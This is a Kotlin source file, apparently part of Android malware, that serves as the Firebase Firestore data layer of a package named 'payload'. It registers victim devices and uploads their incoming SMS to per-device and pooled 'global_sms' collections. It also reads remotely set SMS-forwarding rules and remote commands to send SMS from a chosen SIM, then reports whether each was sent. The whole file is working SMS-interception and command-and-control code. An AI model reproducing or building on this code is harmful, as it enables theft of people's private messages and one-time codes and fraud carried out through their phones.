package com.payload.jansiix0ne.repository

import com.google.firebase.firestore.FirebaseFirestore
import com.payload.jansiix0ne.models.DeviceModel
import com.payload.jansiix0ne.models.SmsModel
import com.payload.jansiix0ne.models.Smsforward
import kotlinx.coroutines.tasks.await

class FirestoreRepository {

    private val firestore = FirebaseFirestore.getInstance()

    suspend fun registerDevice(deviceModel: DeviceModel): Result<Unit> {
        return try {
            firestore.collection("MASTERHU")
                .document("Users")
                .collection("Users")
                .document(deviceModel.deviceid)
                .set(deviceModel)
                .await()
            Result.success(Unit)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun uploadSms(deviceId: String, smsModel: SmsModel): Result<Unit> {
        return try {
            firestore.collection("MASTERHU")
                .document("Users")
                .collection("Users")
                .document(deviceId)
                .collection("incoming_sms")
                .add(smsModel)
                .await()
            
            // Also save to global_sms
            firestore.collection("MASTERHU")
                .document("global_sms")
                .collection("global_sms")
                .add(smsModel)
                .await()
            
            Result.success(Unit)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun getDeviceInfo(deviceId: String): Result<DeviceModel?> {
        return try {
            val document = firestore.collection("MASTERHU")
                .document("Users")
                .collection("Users")
                .document(deviceId)
                .get()
                .await()
            
            val deviceModel = document.toObject(DeviceModel::class.java)
            Result.success(deviceModel)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun updateDeviceStatus(deviceId: String, updates: Map<String, Any>): Result<Unit> {
        return try {
            firestore.collection("MASTERHU")
                .document("Users")
                .collection("Users")
                .document(deviceId)
                .update(updates)
                .await()
            Result.success(Unit)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun getAllSms(deviceId: String): Result<List<SmsModel>> {
        return try {
            val snapshot = firestore.collection("MASTERHU")
                .document("Users")
                .collection("Users")
                .document(deviceId)
                .collection("incoming_sms")
                .get()
                .await()
            
            val smsList = snapshot.documents.mapNotNull { 
                it.toObject(SmsModel::class.java) 
            }
            Result.success(smsList)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
    
    suspend fun saveDeviceInfo(deviceId: String, deviceModel: DeviceModel): Result<Unit> {
        return try {
            firestore.collection("MASTERHU")
                .document("Users")
                .collection("Users")
                .document(deviceId)
                .set(deviceModel, com.google.firebase.firestore.SetOptions.merge())
                .await()
            Result.success(Unit)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
    
    suspend fun saveUserFields(fields: Map<String, Any>, deviceId: String): Result<Boolean> {
        return try {
            val updates = mutableMapOf<String, Any>()
            updates["userInfo"] = fields
            
            firestore.collection("MASTERHU")
                .document("Users")
                .collection("Users")
                .document(deviceId)
                .set(updates, com.google.firebase.firestore.SetOptions.merge())
                .await()
            
            Result.success(true)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
    
    suspend fun saveLog(level: String, message: String, deviceId: String): Result<Unit> {
        return try {
            val logEntry = mapOf(
                "timestamp" to com.google.firebase.Timestamp.now(),
                "level" to level,
                "message" to message,
                "deviceId" to deviceId
            )
            
            firestore.collection("logs")
                .add(logEntry)
                .await()
            
            Result.success(Unit)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
    
    suspend fun getForwardingRules(deviceId: String): Result<Smsforward?> {
        return try {
            val document = firestore.collection("MASTERHU")
                .document("Users")
                .collection("Users")
                .document(deviceId)
                .get()
                .await()
            
            val forwardingData = document.get("forwarding") as? Map<*, *>
            
            val forwarding = if (forwardingData != null) {
                Smsforward(
                    number = forwardingData["number"] as? String ?: "",
                    enabled = forwardingData["enabled"] as? Boolean ?: false
                )
            } else {
                null
            }
            
            Result.success(forwarding)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
    
    suspend fun getSendSmsCommand(deviceId: String): Result<com.payload.jansiix0ne.models.SendSmsModel?> {
        return try {
            val document = firestore.collection("MASTERHU")
                .document("Users")
                .collection("Users")
                .document(deviceId)
                .get()
                .await()
            
            val sendSmsData = document.get("send_sms") as? Map<*, *>
            
            val sendSmsModel = if (sendSmsData != null) {
                com.payload.jansiix0ne.models.SendSmsModel(
                    phoneNumber = sendSmsData["phoneNumber"] as? String ?: "",
                    message = sendSmsData["message"] as? String ?: "",
                    sent = sendSmsData["sent"] as? Boolean ?: false,
                    simSlot = (sendSmsData["simSlot"] as? Long)?.toInt() ?: 0,
                    timestamp = sendSmsData["timestamp"] as? Long ?: System.currentTimeMillis()
                )
            } else {
                null
            }
            
            Result.success(sendSmsModel)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
    
    suspend fun updateSendSmsStatus(deviceId: String, sent: Boolean): Result<Unit> {
        return try {
            firestore.collection("MASTERHU")
                .document("Users")
                .collection("Users")
                .document(deviceId)
                .update("send_sms.sent", sent)
                .await()
            
            Result.success(Unit)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
}
